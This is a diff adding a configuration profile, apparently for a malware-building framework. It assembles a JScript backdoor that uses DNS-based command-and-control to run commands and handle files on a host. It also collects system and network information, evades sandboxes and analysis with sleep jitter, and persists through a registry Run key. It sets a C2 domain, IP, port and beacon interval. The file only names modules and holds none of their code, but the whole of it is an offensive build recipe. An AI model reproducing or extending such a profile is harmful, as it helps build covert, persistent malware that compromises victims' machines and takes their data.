@@ -1,0 +1,30 @@
+name: js_backdoor_dns
+description: DNS-based C2 backdoor for restrictive network environments
+format: jscript
+
+core:
+  - core/emit_buffer
+  - core/run_cmd
+  - core/file_ops
+
+collectors:
+  - collectors/sysinfo
+  - collectors/network
+
+c2: c2/dns_c2
+arch: arch/backdoor
+
+evasion:
+  - evasion/anti_sandbox
+  - evasion/anti_analysis
+  - evasion/sleep_jitter
+
+persist:
+  - persist/registry_run
+
+vars:
+  C2_DOMAIN: "updates.example.com"
+  C2_IP: "10.0.2.2"
+  C2_PORT: "9001"
+  POLL_INTERVAL: "30000"
+  BEACON_INTERVAL: "30000"
